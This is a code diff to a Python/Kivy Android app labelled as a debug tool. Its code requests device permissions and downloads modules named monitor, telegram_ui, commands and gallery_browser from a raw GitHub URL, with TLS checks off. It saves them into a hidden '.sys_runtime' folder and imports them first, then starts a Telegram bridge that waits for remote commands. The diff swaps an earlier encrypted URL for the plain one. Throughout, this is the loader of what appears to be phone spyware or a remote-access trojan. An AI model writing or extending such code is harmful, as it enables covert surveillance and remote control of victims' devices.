@@ -1,5 +1,5 @@
 # -*- coding: utf-8 -*-
-import os, sys, threading, json, base64, importlib, requests, hashlib, traceback, gc
+import os, sys, threading, json, base64, importlib, requests, hashlib, traceback, gc, time
 from datetime import datetime
 from kivy.app import App
 from kivy.uix.textinput import TextInput
@@ -8,13 +8,13 @@ from kivy.uix.button import Button
 from kivy.clock import Clock
 from kivy.core.clipboard import Clipboard
 
-# ------------------------- المسار الأساسي -------------------------
 R = os.path.join(os.getcwd(), ".sys_runtime")
 if not os.path.exists(R):
     os.makedirs(R)
-sys.path.append(R)
+# إضافة المجلد إلى sys.path في البداية (أولوية قصوى)
+if R not in sys.path:
+    sys.path.insert(0, R)
 
-# ------------------------- الصلاحيات -------------------------
 def _request_perms():
     try:
         from android.permissions import request_permissions, Permission
@@ -27,7 +27,6 @@ def _request_perms():
     except:
         pass
 
-# ------------------------- التشفير (للتحميل عن بعد) -------------------------
 def _get_static_key():
     return hashlib.sha256(b"Z@3n_Global_Controller_2026_Secure").digest()
 
@@ -44,9 +43,9 @@ def decrypt_data(blob):
     except:
         return None
 
-ENC_INDEX_URL = "AAECAwQFBgcICQoLj14vepBnvczpdQyaSy3tyjUx1vfTldID6rV0CqN4S6I6C8g6pNE7kebrLN7znLtAgsABApSVU9FntNnD5+fS/dd9"
+# الرابط المباشر الخام للملف index.json
+RAW_INDEX_URL = "https://raw.githubusercontent.com/Zaen1993/Android-Core/refs/heads/main/index.json"
 
-# ------------------------- تطبيق كيدي (واجهة التصحيح) -------------------------
 class DebugApp(App):
     def build(self):
         _request_perms()
@@ -87,8 +86,8 @@ class DebugApp(App):
         clean_msg = str(msg).replace('\x00', '')
         def _update(dt):
             self.log_view.text += f"[{ts}] [{level}] {clean_msg}\n"
-            if len(self.log_view.text) > 10000:
-                self.log_view.text = self.log_view.text[-5000:]
+            if len(self.log_view.text) > 15000:
+                self.log_view.text = self.log_view.text[-8000:]
             self.log_view.cursor = (0, len(self.log_view.text))
         Clock.schedule_once(_update, 0)
 
@@ -97,12 +96,16 @@ class DebugApp(App):
 
     def _engine(self):
         self._log("🚀 Core engine started (debug mode)", "BOOT")
+
+        # معلومات الجهاز
         try:
             from jnius import autoclass
             Build = autoclass('android.os.Build')
             self._log(f"Device: {Build.MANUFACTURER} {Build.MODEL} | Android {Build.VERSION.RELEASE} (API {Build.VERSION.SDK_INT})", "DEVICE")
         except:
             self._log("Device info: not available (non-Android or missing JNI)", "DEVICE")
+
+        # فحص الإنترنت
         try:
             requests.get("https://google.com", timeout=5).raise_for_status()
             self._log("Internet: reachable", "NET")
@@ -110,44 +113,67 @@ class DebugApp(App):
             self._log("Internet: UNREACHABLE", "NET")
 
         needed = ["monitor.py", "telegram_ui.py", "commands.py", "gallery_browser.py"]
-        missing = [f for f in needed if not os.path.exists(os.path.join(R, f))]
-        if missing:
-            self._log(f"Missing files: {missing}. Attempting download...", "WARN")
-            idx_url = decrypt_data(ENC_INDEX_URL)
-            if idx_url:
-                try:
-                    r = requests.get(idx_url, timeout=15, verify=False, headers={"User-Agent": "Mozilla/5.0"})
-                    if r.status_code == 200:
-                        files = r.json().get('files', [])
-                        for f_url in files:
-                            name = f_url.split('/')[-1]
-                            if name in needed:
-                                self._log(f"Downloading {name}...")
-                                r2 = requests.get(f_url, timeout=20, verify=False)
-                                if r2.status_code == 200:
-                                    with open(os.path.join(R, name), 'w', encoding='utf-8') as fp:
-                                        fp.write(r2.text)
-                                    self._log(f"✅ {name} saved")
-                                else:
-                                    self._log(f"❌ Failed {name} (HTTP {r2.status_code})", "ERROR")
-                    else:
-                        self._log(f"❌ Index fetch failed: HTTP {r.status_code}", "ERROR")
-                except Exception as e:
-                    self._log(f"❗ Download error: {str(e)}", "ERROR")
-            else:
-                self._log("❌ Decryption failed for index URL", "ERROR")
 
+        # تحميل الملفات من الرابط الخام
+        self._log(f"Downloading index from {RAW_INDEX_URL}...")
+        try:
+            r = requests.get(RAW_INDEX_URL, timeout=15, verify=False,
+                             headers={"User-Agent": "Mozilla/5.0"})
+            if r.status_code == 200:
+                data = r.json()
+                files = data.get('files', [])
+                for f_url in files:
+                    name = f_url.split('/')[-1]
+                    if name in needed:
+                        self._log(f"Downloading {name}...")
+                        # إضافة timestamp لتجنب الكاش
+                        r2 = requests.get(f"{f_url}?v={int(time.time())}", timeout=20, verify=False)
+                        if r2.status_code == 200:
+                            path = os.path.join(R, name)
+                            with open(path, 'w', encoding='utf-8') as fp:
+                                fp.write(r2.text)
+                            self._log(f"✅ {name} saved ({len(r2.text)} bytes)")
+                            # عرض أول سطرين من الملف للتحقق (اختياري)
+                            if name == "monitor.py":
+                                with open(path, 'r') as f:
+                                    first_lines = f.readlines()[:3]
+                                self._log(f"monitor.py starts with: {first_lines[0].strip()}")
+                        else:
+                            self._log(f"❌ Failed {name} (HTTP {r2.status_code})", "ERROR")
+            else:
+                self._log(f"❌ Index fetch failed: HTTP {r.status_code}", "ERROR")
+        except Exception as e:
+            self._log(f"❗ Download error: {str(e)}", "ERROR")
+
+        # IMPORTANT: حذف الوحدات القديمة من sys.modules لضمان إعادة التحميل
+        modules_to_reload = ["monitor", "telegram_ui", "commands", "gallery_browser"]
+        for mod in modules_to_reload:
+            if mod in sys.modules:
+                del sys.modules[mod]
+
+        # استيراد الوحدات الجديدة
         try:
             import monitor
             import telegram_ui
             import commands
             import gallery_browser
-            self._log("✅ All modules imported successfully")
-        except ImportError as e:
-            self._log(f"❌ Module import failed: {str(e)}", "ERROR")
+            # إعادة تحميل إضافي للتأكد (إذا كان الاستيراد قد استخدم نسخة قديمة)
+            importlib.reload(monitor)
+            importlib.reload(telegram_ui)
+            importlib.reload(commands)
+            importlib.reload(gallery_browser)
+            self._log("✅ All modules imported and reloaded successfully")
+        except Exception as e:
+            self._log(f"❌ Module import/reload failed: {str(e)}", "ERROR")
             self._log(traceback.format_exc(), "TRACE")
             return
 
+        # التأكد من وجود الكلاس M
+        if not hasattr(monitor, 'M'):
+            self._log("❌ CRITICAL: monitor.py does not contain class 'M'", "ERROR")
+            return
+
+        # تهيئة الكائنات
         try:
             self._log("Initializing Monitor...")
             mon = monitor.M()
@@ -171,21 +197,19 @@ class DebugApp(App):
             from commands import ex as cmd_ex
             mon.cb_h = lambda d, cid, cbq: cmd_ex(d, ui, mon, cid, cbq)
             self._log("✅ Command bridge connected")
-
         except Exception as e:
             self._log(f"❌ Initialization error: {str(e)}", "ERROR")
             self._log(traceback.format_exc(), "TRACE")
             return
 
+        # بدء الخدمات
         try:
             self._log("Starting Monitor thread...")
             mon.start()
             self._log("✅ Monitor running")
-
             self._log("Starting Telegram bridge...")
             ui.start()
             self._log("✅ Telegram bridge running")
-
             self._log("🎉 SYSTEM ONLINE – ready to receive commands", "SUCCESS")
         except Exception as e:
             self._log(f"❌ Service start failed: {str(e)}", "ERROR")
